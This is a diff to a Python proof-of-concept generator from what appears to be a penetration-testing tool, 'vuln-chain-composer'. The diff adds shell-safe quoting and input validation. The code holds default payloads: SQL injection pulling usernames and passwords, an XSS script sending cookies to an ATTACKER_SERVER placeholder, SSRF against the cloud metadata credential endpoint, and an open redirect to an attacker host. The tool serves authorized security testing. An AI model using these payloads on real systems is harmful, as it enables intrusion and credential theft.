@@ -7,91 +7,101 @@ Author: orizon.one
 
 import argparse
 import json
-import textwrap
+import re
+import shlex
 from pathlib import Path
-from datetime import datetime
+from datetime import datetime, timezone
+from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
 
 
 from _common import log, success, warn
+def _url_with_parameter(url, parameter, value):
+    parsed = urlsplit(str(url))
+    query = parse_qsl(parsed.query, keep_blank_values=True)
+    query.append((str(parameter), str(value)))
+    return urlunsplit(parsed._replace(query=urlencode(query)))
+
+
+def _curl(url, method="GET", data=None, headers=(), flags=()):
+    """Build a POSIX-shell-safe curl command with certificate checks enabled."""
+    parts = ["curl", "-s", *flags]
+    method = str(method).upper()
+    if method != "GET":
+        parts.extend(["-X", shlex.quote(method)])
+    for header in headers:
+        parts.extend(["-H", shlex.quote(str(header))])
+    if data is not None:
+        parts.extend(["-d", shlex.quote(str(data))])
+    parts.extend(["--", shlex.quote(str(url))])
+    return " ".join(parts)
+
+
 def generate_curl_command(step, finding):
-    """Generate a curl command for a single exploitation step."""
+    """Generate a shell-safe curl command from finding data."""
     url = finding.get("url", step.get("target", "https://TARGET"))
     method = finding.get("method", "GET")
     payload = finding.get("payload", "")
     parameter = finding.get("parameter", "")
-    vuln_type = finding.get("type", "")
+    vuln_type = str(finding.get("type", "")).lower()
 
-    if "sqli" in vuln_type:
-        if payload:
-            inject_payload = payload
-        else:
-            inject_payload = "' UNION SELECT username,password FROM users--"
-        if method == "GET":
-            return f"curl -s -k '{url}?{parameter}={inject_payload}'"
-        else:
-            return f"curl -s -k -X POST '{url}' -d '{parameter}={inject_payload}'"
-
-    elif "xss" in vuln_type:
-        xss_payload = payload or "<script>document.location='https://ATTACKER_SERVER/steal?c='+document.cookie</script>"
-        if method == "GET":
-            return f"curl -s -k '{url}?{parameter}={xss_payload}'"
-        else:
-            return f"curl -s -k -X POST '{url}' -d '{parameter}={xss_payload}'"
-
-    elif "ssrf" in vuln_type:
-        ssrf_target = payload or "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-        if method == "GET":
-            return f"curl -s -k '{url}?{parameter}={ssrf_target}'"
-        else:
-            return f"curl -s -k -X POST '{url}' -d '{parameter}={ssrf_target}'"
-
-    elif "idor" in vuln_type or "bola" in vuln_type:
-        return f"# Authenticate first, then:\ncurl -s -k '{url}' -H 'Cookie: session=YOUR_SESSION' \\\n  # Change ID parameter to access other users' data"
-
-    elif "redirect" in vuln_type:
-        return f"curl -s -k -L '{url}?redirect=https://ATTACKER_SERVER/capture'"
-
-    elif "takeover" in vuln_type:
-        return f"# Verify dangling CNAME:\ndig {finding.get('domain', 'TARGET')} CNAME\n# Check if target service is claimable"
-
-    elif "jwt" in vuln_type:
+    if "jwt" in vuln_type:
         return (
             "# Decode JWT:\n"
             "echo 'YOUR_JWT_TOKEN' | cut -d'.' -f2 | base64 -d 2>/dev/null\n"
             "# Modify claims and re-sign (or use alg:none)"
         )
+    if "takeover" in vuln_type:
+        domain = shlex.quote(str(finding.get("domain", "TARGET")))
+        return f"# Verify dangling CNAME:\ndig {domain} CNAME\n# Check if target service is claimable"
+    if "bucket" in vuln_type:
+        return f"{_curl(url)} | head -50\n# Or: aws s3 ls s3://BUCKET_NAME --no-sign-request"
+    if "idor" in vuln_type or "bola" in vuln_type:
+        return "# Authenticate first, then:\n" + _curl(
+            url, headers=("Cookie: session=YOUR_SESSION",)
+        ) + "\n# Change the ID parameter only within authorized scope."
+    if "redirect" in vuln_type:
+        target = _url_with_parameter(url, "redirect", "https://ATTACKER_SERVER/capture")
+        return _curl(target, flags=("-L",))
 
-    elif "bucket" in vuln_type:
-        return f"curl -s -k '{url}' | head -50\n# Or: aws s3 ls s3://BUCKET_NAME --no-sign-request"
-
+    if "sqli" in vuln_type:
+        value = payload or "' UNION SELECT username,password FROM users--"
+    elif "xss" in vuln_type:
+        value = payload or "<script>document.location='https://ATTACKER_SERVER/steal?c='+document.cookie</script>"
+    elif "ssrf" in vuln_type:
+        value = payload or "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
     elif "ssti" in vuln_type:
-        ssti_payload = payload or "{{7*7}}"
-        return f"curl -s -k '{url}' -d '{parameter}={ssti_payload}'"
-
+        value = payload or "{{7*7}}"
     else:
-        if method == "GET":
-            return f"curl -s -k '{url}'"
-        else:
-            poc_value = payload or "test"
-            return f"curl -s -k -X POST '{url}' -d '{parameter}={poc_value}'"
+        value = payload or "test"
 
+    if str(method).upper() == "GET":
+        return _curl(_url_with_parameter(url, parameter, value))
+    return _curl(url, method, urlencode({str(parameter): str(value)}))
 
 def generate_python_poc(chain):
     """Generate a complete Python PoC script for a chain."""
-    chain_name = chain.get("name", "Unknown Chain")
+    chain_name = str(chain.get("name", "Unknown Chain"))
     phases = chain.get("phases", [])
-    primary = chain.get("primary_finding", chain.get("original_correlation", {}).get("primary_finding", {}))
+    if not isinstance(phases, list):
+        phases = []
+    original = chain.get("original_correlation", {})
+    if not isinstance(original, dict):
+        original = {}
+    primary = chain.get("primary_finding", original.get("primary_finding", {}))
+    if not isinstance(primary, dict):
+        primary = {}
 
     lines = []
     lines.append('#!/usr/bin/env python3')
     lines.append('"""')
-    lines.append(f'PoC: {chain_name}')
+    lines.append('Generated proof of concept; chain metadata is embedded as data.')
     lines.append(f'Generated by vuln-chain-composer (orizon.one)')
     lines.append(f'AUTHORIZED TESTING ONLY - DO NOT USE WITHOUT PERMISSION')
     lines.append('"""')
     lines.append('')
     lines.append('import http.client')
     lines.append('import json')
+    lines.append('import os')
     lines.append('import ssl')
     lines.append('import sys')
     lines.append('import time')
@@ -99,14 +109,15 @@ def generate_python_poc(chain):
     lines.append('')
     lines.append('')
     lines.append('# Configuration - UPDATE THESE VALUES')
-    lines.append(f'TARGET = "{primary.get("url", "https://TARGET")}"')
+    lines.append(f'TARGET = {str(primary.get("url", "https://TARGET"))!r}')
+    lines.append(f'CHAIN_NAME = {chain_name!r}')
     lines.append('SESSION_COOKIE = "YOUR_SESSION_COOKIE"')
     lines.append('ATTACKER_SERVER = "https://YOUR_ATTACKER_SERVER"')
     lines.append('')
-    lines.append('# Disable SSL verification for testing')
     lines.append('CTX = ssl.create_default_context()')
-    lines.append('CTX.check_hostname = False')
-    lines.append('CTX.verify_mode = ssl.CERT_NONE')
+    lines.append('if os.environ.get("CATUS_INSECURE_TLS") == "1":')
+    lines.append('    CTX.check_hostname = False')
+    lines.append('    CTX.verify_mode = ssl.CERT_NONE')
     lines.append('')
     lines.append('')
     lines.append('def make_request(url, method="GET", data=None, headers=None, follow_redirects=True):')
@@ -155,26 +166,36 @@ def generate_python_poc(chain):
     # Generate step functions
     step_funcs = []
     for phase_idx, phase in enumerate(phases):
-        if not phase.get("detailed_steps"):
+        if not isinstance(phase, dict):
+            continue
+        detailed_steps = phase.get("detailed_steps", [])
+        if not isinstance(detailed_steps, list) or not detailed_steps:
             # Handle simpler chain format (from correlate.py directly)
             continue
 
-        func_name = f"step_{phase_idx + 1}_{phase.get('phase', 'unknown').lower().replace(' ', '_')}"
+        phase_name = str(phase.get("phase", "Unknown"))
+        phase_slug = re.sub(r"[^a-z0-9_]+", "_", phase_name.lower()).strip("_")[:40] or "phase"
+        func_name = f"step_{phase_idx + 1}_{phase_slug}"
+        technique = str(phase.get("technique", ""))
+        phase_target = str(phase.get("target", ""))
         step_funcs.append(func_name)
 
         lines.append(f'def {func_name}(context):')
-        lines.append(f'    """Phase: {phase.get("phase", "Unknown")} - {phase.get("technique", "")}"""')
-        lines.append(f'    print(f"\\n[*] Phase {phase_idx + 1}: {phase.get("phase", "")}")')
-        lines.append(f'    print(f"    Technique: {phase.get("technique", "")}")')
-        lines.append(f'    print(f"    Target: {phase.get("target", "")}")')
+        lines.append(f'    phase_name = {phase_name!r}')
+        lines.append(f'    technique = {technique!r}')
+        lines.append(f'    phase_target = {phase_target!r}')
+        lines.append(f'    print(f"\\n[*] Phase {phase_idx + 1}: {{phase_name}}")')
+        lines.append('    print(f"    Technique: {technique}")')
+        lines.append('    print(f"    Target: {phase_target}")')
         lines.append('')
 
-        for step in phase.get("detailed_steps", []):
-            action = step.get("action", "").replace('"', '\\"')
-            lines.append(f'    print(f"    Step {step.get("step", "?")}: {action}")')
+        for step in detailed_steps:
+            action = str(step.get("action", "")) if isinstance(step, dict) else str(step)
+            step_label = str(step.get("step", "?")) if isinstance(step, dict) else "?"
+            lines.append(f'    print("    Step " + {step_label!r} + ": " + {action!r})')
 
         lines.append('')
-        lines.append(f'    # TODO: Implement actual exploitation for {phase.get("technique", "this phase")}')
+        lines.append('    # TODO: Implement the authorized reproduction step for this phase.')
         lines.append(f'    target_url = context.get("target", TARGET)')
         lines.append(f'    resp = make_request(target_url)')
         lines.append(f'    print(f"    Response: {{resp[\'status\']}}")')
@@ -196,14 +217,17 @@ def generate_python_poc(chain):
     if not step_funcs:
         steps = chain.get("steps", [])
         original = chain.get("original_correlation", chain)
-        steps = original.get("steps", steps)
+        if isinstance(original, dict):
+            steps = original.get("steps", steps)
+        if not isinstance(steps, list):
+            steps = []
         for step_idx, step_text in enumerate(steps):
             func_name = f"step_{step_idx + 1}"
             step_funcs.append(func_name)
-            safe_text = step_text.replace('"', '\\"')
+            safe_text = str(step_text)
             lines.append(f'def {func_name}(context):')
-            lines.append(f'    """Step {step_idx + 1}: {safe_text}"""')
-            lines.append(f'    print(f"\\n[*] Step {step_idx + 1}: {safe_text}")')
+            lines.append(f'    step_text = {safe_text!r}')
+            lines.append(f'    print(f"\\n[*] Step {step_idx + 1}: {{step_text}}")')
             lines.append(f'    # TODO: Implement this step')
             lines.append(f'    target_url = context.get("target", TARGET)')
             lines.append(f'    resp = make_request(target_url)')
@@ -216,7 +240,7 @@ def generate_python_poc(chain):
     # Main execution
     lines.append('def main():')
     lines.append(f'    print("=" * 60)')
-    lines.append(f'    print(f"  PoC: {chain_name}")')
+    lines.append('    print(f"  PoC: {CHAIN_NAME}")')
     lines.append(f'    print(f"  Target: {{TARGET}}")')
     lines.append(f'    print(f"  WARNING: Authorized testing only!")')
     lines.append(f'    print("=" * 60)')
@@ -252,62 +276,67 @@ def generate_python_poc(chain):
 
 
 def generate_curl_sequence(chain):
-    """Generate a sequence of curl commands for the chain."""
-    lines = []
-    lines.append(f"#!/bin/bash")
-    lines.append(f"# PoC: {chain.get('name', 'Unknown Chain')}")
-    lines.append(f"# Generated by vuln-chain-composer (orizon.one)")
-    lines.append(f"# AUTHORIZED TESTING ONLY")
-    lines.append(f"")
-    lines.append(f"set -e")
-    lines.append(f"")
-    lines.append(f"echo '=== Chain PoC: {chain.get('name', '')} ==='")
-    lines.append(f"echo ''")
+    """Generate shell-safe commands from chain data."""
+    chain_name = str(chain.get("name", "Unknown Chain"))
+    safe_comment = " ".join(chain_name.splitlines())
+    lines = [
+        "#!/bin/bash",
+        "# PoC: " + safe_comment,
+        "# Generated by vuln-chain-composer (orizon.one)",
+        "# AUTHORIZED TESTING ONLY",
+        "set -e",
+        "echo " + shlex.quote("=== Chain PoC: " + chain_name + " ==="),
+        "echo ''",
+    ]
 
-    # Get findings from chain structure
-    primary = chain.get("primary_finding", chain.get("original_correlation", {}).get("primary_finding", {}))
-    supporting = chain.get("supporting_findings", chain.get("original_correlation", {}).get("supporting_findings", []))
-
+    original = chain.get("original_correlation", {})
+    if not isinstance(original, dict):
+        original = {}
+    primary = chain.get("primary_finding", original.get("primary_finding", {}))
+    supporting = chain.get("supporting_findings", original.get("supporting_findings", []))
+    if not isinstance(primary, dict):
+        primary = {}
+    if not isinstance(supporting, list):
+        supporting = []
     all_findings = [primary] + supporting
     steps = chain.get("steps", [])
-
-    # From phases if available
     phases = chain.get("phases", [])
-    if phases:
-        step_num = 0
+
+    if isinstance(phases, list) and phases:
         for phase in phases:
-            lines.append(f"echo '--- {phase.get('phase', 'Step')} ---'")
-            finding = {"url": phase.get("target", ""), "type": phase.get("technique", ""), "method": "GET"}
-            # Try to find matching finding
-            fid = phase.get("finding_id", "")
-            for af in all_findings:
-                if isinstance(af, dict) and af.get("id", "") == fid:
-                    finding = af
+            if not isinstance(phase, dict):
+                continue
+            phase_name = str(phase.get("phase", "Step"))
+            lines.append("echo " + shlex.quote("--- " + phase_name + " ---"))
+            finding = {
+                "url": phase.get("target", ""),
+                "type": phase.get("technique", ""),
+                "method": "GET",
+            }
+            finding_id = phase.get("finding_id", "")
+            for candidate in all_findings:
+                if isinstance(candidate, dict) and candidate.get("id", "") == finding_id:
+                    finding = candidate
                     break
-            for step in phase.get("detailed_steps", []):
-                step_num += 1
-                action = step.get("action", "")
-                lines.append(f"echo 'Step {step_num}: {action}'")
-            curl = generate_curl_command(phase, finding)
-            lines.append(curl)
-            lines.append("echo ''")
-            lines.append("")
-    else:
-        # From simple steps
-        for i, step_text in enumerate(steps):
-            lines.append(f"echo 'Step {i+1}: {step_text}'")
-            finding = all_findings[min(i, len(all_findings) - 1)] if all_findings else {}
+            detailed_steps = phase.get("detailed_steps", [])
+            if isinstance(detailed_steps, list):
+                for index, step in enumerate(detailed_steps, 1):
+                    label = str(step.get("step", index)) if isinstance(step, dict) else str(index)
+                    action = str(step.get("action", "")) if isinstance(step, dict) else str(step)
+                    lines.append("echo " + shlex.quote(f"Step {label}: {action}"))
+            lines.append(generate_curl_command(phase, finding))
+            lines.extend(["echo ''", ""])
+    elif isinstance(steps, list):
+        for index, step_text in enumerate(steps):
+            lines.append("echo " + shlex.quote(f"Step {index + 1}: {step_text}"))
+            finding = all_findings[min(index, len(all_findings) - 1)] if all_findings else {}
             if isinstance(finding, dict):
-                curl = generate_curl_command({"target": finding.get("url", "")}, finding)
-                lines.append(curl)
-            lines.append("echo ''")
-            lines.append("")
+                lines.append(generate_curl_command({"target": finding.get("url", "")}, finding))
+            lines.extend(["echo ''", ""])
 
-    lines.append(f"echo '=== Chain PoC Complete ==='")
+    lines.append("echo " + shlex.quote("=== Chain PoC Complete ==="))
     lines.append("")
-
     return "\n".join(lines)
-
 
 def generate_video_script(chain):
     """Generate a narrated video script for PoC recording."""
@@ -419,7 +448,7 @@ def main():
 
     output = {
         "meta": {
-            "timestamp": datetime.utcnow().isoformat() + "Z",
+            "timestamp": datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z'),
             "type": "chain_poc",
             "tool": "vuln-chain-composer by orizon.one",
             "chains_processed": len(poc_results),
